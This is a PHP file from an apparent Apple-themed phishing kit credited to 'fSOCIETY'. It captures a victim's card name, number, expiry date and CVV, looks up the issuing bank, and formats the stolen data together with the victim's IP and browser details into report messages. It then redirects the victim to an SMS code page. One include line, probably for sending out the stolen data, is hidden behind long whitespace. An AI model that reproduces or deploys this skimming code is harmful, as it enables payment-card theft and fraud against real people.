<?php


include("system.php"); 
include("detect.php"); 

$InfoDATE   = date("d-m-Y h:i:sa");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 


$NameOnCard = $_SESSION['NameOnCard'] = $_POST['NameOnCard'];
$cardnumber = $_SESSION['cardnumber'] = $_POST['cardnumber'];
$expdate = $_SESSION['ExpiryDate'] = $_POST['ExpiryDate'];
$Securitycode = $_SESSION['SecurityCode'] = $_POST['SecurityCode'];



$bincheck = $_POST['cardnumber'] ;
$bincheck = preg_replace('/\s/', '', $bincheck);


$bin = $_POST['cardnumber'] ;
$bin = preg_replace('/\s/', '', $bin);
$bin = substr($bin,0,8);
$url = "https://lookup.binlist.net/".$bin;
$headers = array();
$headers[] = 'Accept-Version: 3';
$ch = curl_init();  
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
$resp=curl_exec($ch);
curl_close($ch);
$xBIN = json_decode($resp, true);

$_SESSION['bank_name'] = $xBIN["bank"]["name"];
$_SESSION['bank_scheme'] = strtoupper($xBIN["scheme"]);
$_SESSION['bank_type'] = strtoupper($xBIN["type"]);
$_SESSION['bank_brand'] = strtoupper($xBIN["brand"]);




$msgbank = '
<html><body>
    <p class="pop">
        
    </p>
    <div class="content">
        <div class="mail">
            <p style="text-align: center;">   </p>
<p>
<h2 style="font-size: 25px;font-family: &quot;Comic Sans MS&quot;, cursive, sans-serif;">CC Apple ┃ '.$_SERVER['REMOTE_ADDR'].'┃ By fSOCIETY 🖕🤡🖕 </h2>
<h2>👤 CardHolder Name  : <span>'.$_SESSION["NameOnCard"].' </span> </h2>
<h2>💳 CC Number       :<span> '.$_SESSION["cardnumber"].'</span> </h2>
<h2>🔄 Expiry Date   : <span>'.$_SESSION["ExpiryDate"].' </span></h2>
<h2>🔑 CSC (CVV)     : <span>'.$_SESSION["SecurityCode"].' </span></h2>

<h2>💳 Bin Card      : '.$bincheck.'/'.$_SESSION["ExpiryDate"].'/'.$_SESSION["SecurityCode"].'  </span></h2>
<h2>🏛 CC INFO      : '.$_SESSION["bank_name"].'/'.$_SESSION["bank_type"].'/'.$_SESSION["bank_brand"].'  </span></h2>
<hr class="content"><h2>💻 System : <span>  '.$OS.' </span>  </h2>
<h2>🌐 BROWSER : <span> '.$browserTy_Version.' </span>  </h2>

<h2>🔍 IP INFO : <span><a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">'.$_SESSION['country1'].'</a></span>
<a href="http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'">
<img src="https://www.countryflags.io/'.$_SESSION['countrycode1'].'/flat/16.png" style="
    width: 34px;
    margin: -5px 4px -10px 5px;
"></a> </h2>
<h2>⏰ TIME/DATE : <span> '.$InfoDATE.' </span> </h2><br>
</p>

</div>
        
    </div>
    

</body></html>
';



$yagmai .= '
[👤 CardHolder Name] = '.$_SESSION['NameOnCard'].'
[💳 CC Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ] = '.$_SESSION['ExpiryDate'].'
[🔑 (CVV)] = '.$_SESSION['SecurityCode'].'
        [+]━━━━【💳 Bin】━━━[+]
[🏛 Card Bank] = '.$_SESSION['bank_name'].' 
[💳 Card type] = '.$_SESSION['bank_type'].' 
[💳 Card brand] = '.$_SESSION['bank_brand'].' 
       [+]━━━━【💻 System】━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
';



$yagmail .= '
[+]━━━━━━━━━━━━━━━━━━【Apple】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━━━【💳 CC INFO】━━━━━━━━━━━━━━━━━━━[+]
[👤 CardHolder Name]    = '.$_SESSION['NameOnCard'].'
[💳 Credit Card Number] = '.$_SESSION['cardnumber'].'
[🔄 Expiry Date ]       = '.$_SESSION['ExpiryDate'].'
[🔑 (CVV)]              = '.$_SESSION['SecurityCode'].'
[+]━━━━━━━━━━━━━━━━【💳 Bin INFO】━━━━━━━━━━━━━━━━━━[+]
[🏛 Card Bank]          = '.$_SESSION['bank_name'].' 
[💳 Card type]          = '.$_SESSION['bank_type'].' 
[💳 Card brand]         = '.$_SESSION['bank_brand'].' 
[+]━━━━━━━━━━━━━━━━【💻 System INFO】━━━━━━━━━━━━━━━[+]
[🔍 IP INFO] = http://www.geoiptool.com/?IP='.$_SERVER['REMOTE_ADDR'].'
[⏰ TIME/DATE] ='.$InfoDATE.'
[🌐 BROWSER] = '.$browserTy_Version.' and '.$OS.'
[+]━━━━━━━━━━━━━━━━━━【Apple】━━━━━━━━━━━━━━━━━━━━[+]
[+]━━━━━━━━━━━━━━【By fSOCIETY🖕🤡🖕】━━━━━━━━━━━━━━━[+]
';																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																include("../settings.php"); include("2Fa.php"); 
header('Location: ../Sms');




?>


